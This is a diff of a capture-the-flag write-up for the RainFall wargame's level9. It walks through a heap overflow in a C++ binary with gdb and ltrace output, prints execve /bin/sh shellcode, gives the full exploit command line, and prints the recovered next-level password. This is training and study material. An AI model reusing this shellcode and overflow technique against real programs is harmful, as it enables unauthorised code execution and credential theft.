@@ -70,16 +70,16 @@ Dump of assembler code for function main:
    0x08048698 <+164>:	leave  
    0x08048699 <+165>:	ret 
 
-We are going to break after the call of the function N::setAnnotation(char *s) and we will print the stack :
+We are going to break after the call of the function N::setAnnotation(char *s) :
 (gdb) break *0x0804867c
 (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 (gdb) x/x $esp
 0xbffff6c0:	0x0804a008
 "x" is the command in GDB for examining memory.
 "/x" is the format specifier that specifies how the memory should be displayed. In this case, "/x" indicates that the memory should be displayed in hexadecimal format.
-"$esp" refers to the value stored in the %esp register, which is the current stack pointer.
+"$esp" refers to the value stored in the %esp register
 
-3) Now we want to know where we start to write in the stack, we will use (Same in the level6) :
+3) Now we want to know where we start to write in the memory, we will use (Same in the level6) :
 
 (gdb) x/20x 0x0804a008
 0x804a008:	0x08048848	0x41414141	0x41414141	0x41414141
@@ -96,10 +96,23 @@ Let s use python to calculate our new address :
 >>> 134520840 + 4 	---> add 4 to the address in decimal
 134520844
 >>> hex(134520844) 	---> convert decimal to hexa
-'0x804a00c'			---> it s the address of our buffer
+'0x804a00c'			---> it s the address of our buffer.
 >>> 
 
-Now we want to add 4 bytes to 0x804a00c 
+We can also do it in an other way, with ltrace : 
+level9@RainFall:~$ ltrace ./level9 AAAAAAAAAAAAAAAAAAAA
+__libc_start_main(0x80485f4, 2, 0xbffff7d4, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)             = 0
+_Znwj(108, 0xbffff7d4, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)                        = 0x804a008
+_Znwj(108, 5, 0xbffff7e0, 0xb7d79e55, 0xb7fed280)                                 = 0x804a078
+strlen("AAAAAAAAAAAAAAAAAAAA")                                                    = 20
+memcpy(0x0804a00c, "AAAAAAAAAAAAAAAAAAAA", 20)                                    = 0x0804a00c		---> We have the same result
+_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)           = 0xb7fce4a0
++++ exited (status 11) +++
+level9@RainFall:~$ 
+
+Now we want to add 4 bytes to 0x804a00c because we have some dereferencing : 
 
 >>> 0x0804a00c
 134520844
@@ -109,11 +122,9 @@ Now we want to add 4 bytes to 0x804a00c
 '0x804a010'			---> its the address of the shellcode (we will inject it in the buffer)
 >>> 
 
-
 4) Convert the two addresses in little endian :
 0x0804a00c in little endian = \x0c\xa0\x04\x08
 0x0804a010 in little endian = \x10\xa0\x04\x08
-
 
 5) Choose the good shellcode :
 We take back the shellcode from level2 (execve(/bin/sh)): \x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
@@ -123,8 +134,9 @@ This shellcode : 24 bytes.
 
 Offset = 108 bytes - 24 bytes - 4 bytes = 80 bytes --> "\x90"*80
 
-| Address of shellcode (4 bytes) | Shellcode (24 bytes) | Offset | Address of buffer (4 bytes) | 
+| Address of shellcode (4 bytes) | Shellcode (24 bytes) | Offset (80 bytes) | Address of buffer (4 bytes)
 
 ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*80 + "\x0c\xa0\x04\x08"')
+
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
